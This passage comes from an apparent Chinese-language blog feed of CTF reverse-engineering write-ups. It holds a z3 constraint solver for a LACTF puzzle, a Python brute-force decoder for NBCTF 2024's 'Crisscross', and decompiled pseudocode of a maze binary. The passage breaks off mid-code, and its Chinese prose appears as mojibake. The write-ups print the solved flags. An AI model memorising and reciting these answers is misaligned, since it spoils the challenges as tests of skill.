<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">key = [ <span class="number">0x08</span>, <span class="number">0x6B</span>, <span class="number">0xD0</span>, <span class="number">0xFE</span>, <span class="number">0x49</span>, <span class="number">0xCB</span>, <span class="number">0xAC</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>, <span class="number">0xF7</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0xBA</span>, <span class="number">0x4B</span>, <span class="number">0xAE</span>, <span class="number">0x95</span>, <span class="number">0x69</span>, <span class="number">0x08</span>, <span class="number">0xF3</span>, <span class="number">0xBC</span>, <span class="number">0x4E</span>, </span><br><span class="line">        <span class="number">0xED</span>, <span class="number">0x18</span>, <span class="number">0x4A</span>, <span class="number">0x6B</span>, <span class="number">0xE0</span>, <span class="number">0xDE</span>, <span class="number">0xF4</span>, <span class="number">0x42</span>, <span class="number">0xE5</span>, <span class="number">0xD3</span>, </span><br><span class="line">        <span class="number">0xD9</span>, <span class="number">0xA8</span>, <span class="number">0x3C</span>, <span class="number">0xCF</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x71</span>, <span class="number">0x0E</span>, <span class="number">0x16</span>, <span class="number">0x16</span>, </span><br><span class="line">        <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">key2 = [<span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, </span><br><span class="line">        <span class="number">0x15</span>, <span class="number">0x07</span>, <span class="number">0x18</span>, <span class="number">0x04</span>, <span class="number">0x19</span>, <span class="number">0x05</span>, <span class="number">0x1C</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x04</span>, </span><br><span class="line">        <span class="number">0x21</span>, <span class="number">0x05</span>, <span class="number">0x22</span>, <span class="number">0x08</span>, <span class="number">0x26</span>, <span class="number">0x05</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x08</span>, </span><br><span class="line">        <span class="number">0x35</span>, <span class="number">0x06</span>, <span class="number">0x36</span>, <span class="number">0x01</span>, <span class="number">0x3B</span>, <span class="number">0x03</span>, <span class="number">0x47</span>, <span class="number">0x08</span>, <span class="number">0x4A</span>, <span class="number">0x06</span>, </span><br><span class="line">        <span class="number">0x4B</span>, <span class="number">0x04</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x4F</span>, <span class="number">0x07</span>]</span><br><span class="line">masks = [<span class="number">240</span>, <span class="number">240</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">240</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">240</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">240</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">240</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">key_after_mask = [<span class="number">96</span>, <span class="number">80</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag_%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>)]</span><br><span class="line">s.add(And([And(flag[i] &lt; <span class="number">0x7f</span>, flag[i] &gt; <span class="number">0x40</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>)]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">54</span> * <span class="number">6</span>, <span class="number">6</span>):</span><br><span class="line">    v5 = ((flag[<span class="built_in">int</span>(i / <span class="number">6</span>)] - <span class="number">0x40</span>) &lt;&lt; (i &amp; <span class="number">7</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    key[i &gt;&gt; <span class="number">3</span>] ^= v5</span><br><span class="line">    <span class="keyword">if</span> (i &amp; <span class="number">7</span>) &gt; <span class="number">2</span>:</span><br><span class="line">        v6 = ((flag[<span class="built_in">int</span>(i / <span class="number">6</span>)] - <span class="number">0x40</span>) &gt;&gt; (<span class="number">8</span> - (i &amp; <span class="number">7</span>))) &amp; <span class="number">0xff</span></span><br><span class="line">        key[(i &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>] ^= v6</span><br><span class="line">s.add(And([And([(key[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span> &lt;= <span class="number">8</span>, key[i] &amp; <span class="number">0xf</span> &lt;= <span class="number">8</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    s.add(key[i] &amp; masks[i] == key_after_mask[i])</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    v11 = <span class="number">0</span></span><br><span class="line">    v12 = <span class="number">0</span></span><br><span class="line">    v13 = <span class="number">0</span></span><br><span class="line">    count = <span class="built_in">round</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        temp1 = BitVec(<span class="string">&quot;temp1&quot;</span>, <span class="number">12</span>)</span><br><span class="line">        temp2 = BitVec(<span class="string">&quot;temp2&quot;</span>, <span class="number">12</span>)</span><br><span class="line">        temp1 = <span class="number">1</span></span><br><span class="line">        temp2 = key[(i + <span class="number">9</span> * <span class="built_in">round</span>) &gt;&gt; <span class="number">1</span>]</span><br><span class="line">        temp2 &gt;&gt;= <span class="number">4</span> * ((i + <span class="number">9</span> * <span class="built_in">round</span>) &amp; <span class="number">1</span>)</span><br><span class="line">        temp2 &amp;= <span class="number">0xf</span></span><br><span class="line">        temp1 &lt;&lt;= temp2</span><br><span class="line">        v13   ^= temp1</span><br><span class="line">        v15   = count</span><br><span class="line">        temp1 = <span class="number">1</span></span><br><span class="line">        temp2 = key[count &gt;&gt; <span class="number">1</span>]</span><br><span class="line">        temp2 &gt;&gt;= <span class="number">4</span> * (count &amp; <span class="number">1</span>)</span><br><span class="line">        temp2 &amp;= <span class="number">0xf</span></span><br><span class="line">        temp1 &lt;&lt;= temp2</span><br><span class="line">        v12   ^= temp1</span><br><span class="line">        temp1 = <span class="number">1</span></span><br><span class="line">        v17 = <span class="built_in">int</span>(i / <span class="number">3</span>) + <span class="built_in">round</span> - <span class="built_in">round</span> % <span class="number">3</span></span><br><span class="line">        v18 = <span class="number">3</span> * <span class="built_in">int</span>(i / <span class="number">3</span>)</span><br><span class="line">        temp2 = key[(<span class="number">3</span> * (<span class="built_in">round</span> % <span class="number">3</span>) + i - v18 + <span class="number">9</span> * v17) &gt;&gt; <span class="number">1</span>]</span><br><span class="line">        temp2 &gt;&gt;= <span class="number">4</span> * ((<span class="number">3</span> * (<span class="built_in">round</span> % <span class="number">3</span>) + i - v18 + <span class="number">9</span> * v17) &amp; <span class="number">1</span>)</span><br><span class="line">        temp2 &amp;= <span class="number">0xf</span></span><br><span class="line">        temp1 &lt;&lt;= temp2</span><br><span class="line">        v11   ^= temp1</span><br><span class="line">        count += <span class="number">9</span></span><br><span class="line">    s.add(And(v11 == <span class="number">0x1FF</span>, v12 == <span class="number">0x1FF</span>, v13 == <span class="number">0x1FF</span>))</span><br><span class="line">final_key = [BitVec(<span class="string">&#x27;final_key_%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">    s.add(final_key[i] == key[i])</span><br><span class="line">s.add(flag[<span class="number">0</span>] == <span class="built_in">ord</span>(<span class="string">&quot;l&quot;</span>), flag[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>), flag[<span class="number">2</span>] == <span class="built_in">ord</span>(<span class="string">&quot;c&quot;</span>), flag[<span class="number">3</span>] == <span class="built_in">ord</span>(<span class="string">&quot;t&quot;</span>), flag[<span class="number">4</span>] == <span class="built_in">ord</span>(<span class="string">&quot;f&quot;</span>), flag[<span class="number">5</span>] == <span class="built_in">ord</span>(<span class="string">&quot;&#123;&quot;</span>), flag[<span class="number">53</span>] == <span class="built_in">ord</span>(<span class="string">&quot;&#125;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(m[flag[i]].as_long()), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="comment"># for i in range(41):</span></span><br><span class="line">    <span class="comment">#     print(hex(m[final_key[i]].as_long()), end = &quot;, &quot;)</span></span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line">    condition = []</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> m:</span><br><span class="line">        condition.append(d() != m[d])</span><br><span class="line">    s.add(Or(condition))</span><br><span class="line"><span class="comment"># lactf&#123;looking_at_the_puzzles_is_honestly_so_overrated&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="technically-correct-ELFæ–‡ä»¶æ ¼å¼"><a href="#technically-correct-ELFæ–‡ä»¶æ ¼å¼" class="headerlink" title="technically-correct | ELFæ–‡ä»¶æ ¼å¼"></a>technically-correct | ELFæ–‡ä»¶æ ¼å¼</h2><p><a href="https://1k0ct.github.io/2024/03/16/ELF%E6%96%87%E4%BB%B6%E5%A4%B4/#%E5%BA%94%E7%94%A8%E5%9C%BA%E5%90%88">ELFæ–‡ä»¶å¤´æ ¼å¼åˆ†æ</a></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ„Ÿè§‰å¤§éƒ¨åˆ†çš„é¢˜ç›®è€ƒéªŒçš„éƒ½æ˜¯å¯¹ä»£ç çš„ç†è§£ å¹¶æ²¡æœ‰æ¶‰åŠéå¸¸ç¥å¿…çš„åŠ å¯†</p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
      </tags>
  </entry>
  <entry>
    <title>NBCTF2024é€†å‘æ–¹å‘wp</title>
    <url>/2024/02/23/NBCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
    <content><![CDATA[<p>å‚èµ›ID:1K0CT</p>
<span id="more"></span>

<h2 id="Crisscross-pyre"><a href="#Crisscross-pyre" class="headerlink" title="Crisscross | pyre"></a>Crisscross | pyre</h2><p>ç»™äº†ä¸€ä¸ªpythonç¨‹åºå’Œå®ƒçš„è¾“å‡º:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">key1 = random.choices(<span class="built_in">range</span>(<span class="number">256</span>), k=<span class="number">20</span>)</span><br><span class="line">key2 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">random.shuffle(key2)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">n</span>):</span><br><span class="line">    q = key2[n]</span><br><span class="line">    w = key1[q % <span class="number">20</span>]</span><br><span class="line">    n ^= q</span><br><span class="line">    <span class="keyword">return</span> n, w</span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag):</span><br><span class="line">    x &lt;&lt;= <span class="number">8</span></span><br><span class="line">    n, w = enc(c)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span>:</span><br><span class="line">        n, w = w, n</span><br><span class="line">    x |= n</span><br><span class="line">    x |= w &lt;&lt; ((<span class="number">2</span> * i + <span class="number">1</span>) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key1)</span><br><span class="line"><span class="built_in">print</span>(key2)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="comment">#[127, 81, 241, 40, 222, 128, 45, 87, 27, 154, 66, 162, 73, 176, 172, 164, 106, 234, 77, 5]</span></span><br><span class="line"><span class="comment">#[155, 117, 124, 113, 104, 46, 151, 71, 144, 229, 152, 240, 199, 88, 103, 105, 245, 209, 13, 82, 166, 9, 201, 233, 228, 154, 19, 5, 30, 141, 81, 206, 246, 232, 107, 29, 208, 253, 187, 116, 98, 160, 60, 7, 220, 143, 80, 239, 52, 15, 94, 50, 149, 241, 57, 92, 230, 100, 31, 51, 36, 24, 39, 14, 25, 90, 101, 55, 194, 225, 157, 102, 2, 26, 148, 161, 180, 120, 223, 165, 32, 146, 185, 243, 119, 210, 172, 244, 1, 125, 44, 35, 169, 179, 188, 64, 207, 33, 137, 200, 142, 182, 250, 195, 28, 4, 79, 191, 86, 215, 96, 236, 91, 122, 196, 87, 118, 231, 126, 97, 147, 67, 132, 190, 234, 237, 43, 193, 252, 18, 212, 163, 56, 73, 123, 176, 162, 23, 192, 49, 21, 242, 171, 112, 153, 238, 203, 134, 167, 93, 115, 95, 8, 12, 65, 217, 248, 168, 219, 47, 211, 108, 76, 129, 145, 62, 156, 34, 218, 135, 48, 70, 75, 3, 249, 72, 202, 133, 183, 38, 37, 227, 164, 173, 159, 251, 0, 174, 54, 20, 136, 53, 138, 99, 226, 178, 42, 66, 150, 205, 204, 214, 197, 235, 110, 216, 63, 45, 184, 74, 41, 177, 27, 69, 130, 89, 61, 247, 255, 17, 254, 181, 131, 22, 224, 83, 189, 59, 114, 139, 111, 68, 6, 84, 11, 127, 221, 106, 77, 109, 158, 170, 16, 121, 222, 186, 10, 58, 175, 40, 128, 198, 78, 85, 213, 140]</span></span><br><span class="line"><span class="comment">#3449711664888782790334923396354433085218951813669043815144799745483347584183883892868078716490762334737115401929391994359609927294549975954045314661787321463018287415952</span></span><br></pre></td></tr></table></figure>

<p>æ±‚å‡ºflagæ¯ä¸€ä½å¯¹åº”çš„<code>(w, n)</code>(éœ€è¦æ³¨æ„çš„æ˜¯<code>w</code>å’Œ<code>n</code>çš„æ’åˆ—é¡ºåºç±»ä¼¼<code>...n[2], w[1], n[0], w[0], n[1], w[1]...</code>) å†ç¨å¾®æ”¹ä¸€ä¸‹åŸç¨‹åºçˆ†ç ´å‡ºflag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key1 = [<span class="number">127</span>, <span class="number">81</span>, <span class="number">241</span>, <span class="number">40</span>, <span class="number">222</span>, <span class="number">128</span>, <span class="number">45</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">154</span>, <span class="number">66</span>, <span class="number">162</span>, <span class="number">73</span>, <span class="number">176</span>, <span class="number">172</span>, <span class="number">164</span>, <span class="number">106</span>, <span class="number">234</span>, <span class="number">77</span>, <span class="number">5</span>]</span><br><span class="line">key2 = [<span class="number">155</span>, <span class="number">117</span>, <span class="number">124</span>, <span class="number">113</span>, <span class="number">104</span>, <span class="number">46</span>, <span class="number">151</span>, <span class="number">71</span>, <span class="number">144</span>, <span class="number">229</span>, <span class="number">152</span>, <span class="number">240</span>, <span class="number">199</span>, <span class="number">88</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">245</span>, <span class="number">209</span>, <span class="number">13</span>, <span class="number">82</span>, <span class="number">166</span>, <span class="number">9</span>, <span class="number">201</span>, <span class="number">233</span>, <span class="number">228</span>, <span class="number">154</span>, <span class="number">19</span>, <span class="number">5</span>, <span class="number">30</span>, <span class="number">141</span>, <span class="number">81</span>, <span class="number">206</span>, <span class="number">246</span>, <span class="number">232</span>, <span class="number">107</span>, <span class="number">29</span>, <span class="number">208</span>, <span class="number">253</span>, <span class="number">187</span>, <span class="number">116</span>, <span class="number">98</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">220</span>, <span class="number">143</span>, <span class="number">80</span>, <span class="number">239</span>, <span class="number">52</span>, <span class="number">15</span>, <span class="number">94</span>, <span class="number">50</span>, <span class="number">149</span>, <span class="number">241</span>, <span class="number">57</span>, <span class="number">92</span>, <span class="number">230</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">51</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">39</span>, <span class="number">14</span>, <span class="number">25</span>, <span class="number">90</span>, <span class="number">101</span>, <span class="number">55</span>, <span class="number">194</span>, <span class="number">225</span>, <span class="number">157</span>, <span class="number">102</span>, <span class="number">2</span>, <span class="number">26</span>, <span class="number">148</span>, <span class="number">161</span>, <span class="number">180</span>, <span class="number">120</span>, <span class="number">223</span>, <span class="number">165</span>, <span class="number">32</span>, <span class="number">146</span>, <span class="number">185</span>, <span class="number">243</span>, <span class="number">119</span>, <span class="number">210</span>, <span class="number">172</span>, <span class="number">244</span>, <span class="number">1</span>, <span class="number">125</span>, <span class="number">44</span>, <span class="number">35</span>, <span class="number">169</span>, <span class="number">179</span>, <span class="number">188</span>, <span class="number">64</span>, <span class="number">207</span>, <span class="number">33</span>, <span class="number">137</span>, <span class="number">200</span>, <span class="number">142</span>, <span class="number">182</span>, <span class="number">250</span>, <span class="number">195</span>, <span class="number">28</span>, <span class="number">4</span>, <span class="number">79</span>, <span class="number">191</span>, <span class="number">86</span>, <span class="number">215</span>, <span class="number">96</span>, <span class="number">236</span>, <span class="number">91</span>, <span class="number">122</span>, <span class="number">196</span>, <span class="number">87</span>, <span class="number">118</span>, <span class="number">231</span>, <span class="number">126</span>, <span class="number">97</span>, <span class="number">147</span>, <span class="number">67</span>, <span class="number">132</span>, <span class="number">190</span>, <span class="number">234</span>, <span class="number">237</span>, <span class="number">43</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">18</span>, <span class="number">212</span>, <span class="number">163</span>, <span class="number">56</span>, <span class="number">73</span>, <span class="number">123</span>, <span class="number">176</span>, <span class="number">162</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">242</span>, <span class="number">171</span>, <span class="number">112</span>, <span class="number">153</span>, <span class="number">238</span>, <span class="number">203</span>, <span class="number">134</span>, <span class="number">167</span>, <span class="number">93</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">65</span>, <span class="number">217</span>, <span class="number">248</span>, <span class="number">168</span>, <span class="number">219</span>, <span class="number">47</span>, <span class="number">211</span>, <span class="number">108</span>, <span class="number">76</span>, <span class="number">129</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">156</span>, <span class="number">34</span>, <span class="number">218</span>, <span class="number">135</span>, <span class="number">48</span>, <span class="number">70</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">249</span>, <span class="number">72</span>, <span class="number">202</span>, <span class="number">133</span>, <span class="number">183</span>, <span class="number">38</span>, <span class="number">37</span>, <span class="number">227</span>, <span class="number">164</span>, <span class="number">173</span>, <span class="number">159</span>, <span class="number">251</span>, <span class="number">0</span>, <span class="number">174</span>, <span class="number">54</span>, <span class="number">20</span>, <span class="number">136</span>, <span class="number">53</span>, <span class="number">138</span>, <span class="number">99</span>, <span class="number">226</span>, <span class="number">178</span>, <span class="number">42</span>, <span class="number">66</span>, <span class="number">150</span>, <span class="number">205</span>, <span class="number">204</span>, <span class="number">214</span>, <span class="number">197</span>, <span class="number">235</span>, <span class="number">110</span>, <span class="number">216</span>, <span class="number">63</span>, <span class="number">45</span>, <span class="number">184</span>, <span class="number">74</span>, <span class="number">41</span>, <span class="number">177</span>, <span class="number">27</span>, <span class="number">69</span>, <span class="number">130</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">247</span>, <span class="number">255</span>, <span class="number">17</span>, <span class="number">254</span>, <span class="number">181</span>, <span class="number">131</span>, <span class="number">22</span>, <span class="number">224</span>, <span class="number">83</span>, <span class="number">189</span>, <span class="number">59</span>, <span class="number">114</span>, <span class="number">139</span>, <span class="number">111</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">84</span>, <span class="number">11</span>, <span class="number">127</span>, <span class="number">221</span>, <span class="number">106</span>, <span class="number">77</span>, <span class="number">109</span>, <span class="number">158</span>, <span class="number">170</span>, <span class="number">16</span>, <span class="number">121</span>, <span class="number">222</span>, <span class="number">186</span>, <span class="number">10</span>, <span class="number">58</span>, <span class="number">175</span>, <span class="number">40</span>, <span class="number">128</span>, <span class="number">198</span>, <span class="number">78</span>, <span class="number">85</span>, <span class="number">213</span>, <span class="number">140</span>]</span><br><span class="line">x = <span class="number">3449711664888782790334923396354433085218951813669043815144799745483347584183883892868078716490762334737115401929391994359609927294549975954045314661787321463018287415952</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">while</span>(x):</span><br><span class="line">    flag.append(x &amp; <span class="number">0xFF</span>)</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span></span><br><span class="line">w_o = []</span><br><span class="line">n_o = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    n_o.append(flag[<span class="number">35</span> + (-<span class="number">1</span> <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">2</span>) <span class="keyword">else</span> <span class="number">1</span>) * ((<span class="number">2</span> * <span class="built_in">int</span>(i / <span class="number">2</span>) + <span class="number">1</span>))])</span><br><span class="line">    w_o.append(flag[<span class="number">35</span> + (-<span class="number">1</span> <span class="keyword">if</span> (i % <span class="number">2</span>) <span class="keyword">else</span> <span class="number">1</span>) * <span class="built_in">int</span>((i + <span class="number">1</span>) / <span class="number">2</span>) * <span class="number">2</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">n</span>):</span><br><span class="line">    q = key2[n]</span><br><span class="line">    w = key1[q % <span class="number">20</span>]</span><br><span class="line">    n ^= q</span><br><span class="line">    <span class="keyword">return</span> n, w</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">125</span>):</span><br><span class="line">        n, w = enc(c)</span><br><span class="line">        <span class="keyword">if</span> n == n_o[i] <span class="keyword">and</span> w == w_o[i]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(c)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># nbctf&#123;cr15s_cr0ss_str4wb3rry_s4uz3&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Shifty-Sands-è¿›é˜¶çš„è¿·å®«é¢˜"><a href="#Shifty-Sands-è¿›é˜¶çš„è¿·å®«é¢˜" class="headerlink" title="Shifty Sands | è¿›é˜¶çš„è¿·å®«é¢˜"></a><strong>Shifty Sands</strong> | è¿›é˜¶çš„è¿·å®«é¢˜</h2><p>ç”¨DIEæ‰“å¼€é™„ä»¶ 64ä½ELFæ— å£³ IDA64æ‰“å¼€ ä¸»å‡½æ•°ç»“æ„éå¸¸ç®€å• èƒœåˆ©çš„åˆ¤æ–­æ˜¯èµ°åˆ°<code>L</code> å¤±è´¥çš„åˆ¤å®šæ˜¯èµ°åˆ°<code>S</code> å”¯ä¸€éœ€è¦è´¹ç‚¹æ—¶é—´çœ‹çš„æ˜¯åŠ äº†ç‚¹æ··æ·†(æ°¸çœŸåˆ¤æ–­)çš„<code>change()</code>å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> row; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> col; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  row = <span class="number">0</span>;</span><br><span class="line">  col = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      input = getchar();</span><br><span class="line">    <span class="keyword">while</span> ( input == <span class="number">10</span> );</span><br><span class="line">    change();                                   <span class="comment">// ä»1å¼€å§‹ç®—</span></span><br><span class="line">                                                <span class="comment">// èµ°åˆ°4n    æ­¥æ—¶Så‘å³æ‰©æ•£</span></span><br><span class="line">                                                <span class="comment">// èµ°åˆ°4n + 3æ­¥æ—¶Så‘ä¸Šæ‰©æ•£</span></span><br><span class="line">                                                <span class="comment">// èµ°åˆ°4n + 2æ­¥æ—¶Så‘å·¦æ‰©æ•£</span></span><br><span class="line">                                                <span class="comment">// èµ°åˆ°4n + 1æ­¥æ—¶Så‘ä¸‹æ‰©æ•£</span></span><br><span class="line">    ++step;</span><br><span class="line">    check(input, &amp;row, &amp;col);</span><br><span class="line">    <span class="keyword">if</span> ( step &gt; <span class="number">49</span> || maze[<span class="number">10</span> * row + col] == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ssssssssss&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( maze[<span class="number">10</span> * row + col] != <span class="string">&#x27;L&#x27;</span> );</span><br><span class="line">  openflag();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// change():</span></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">change</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span 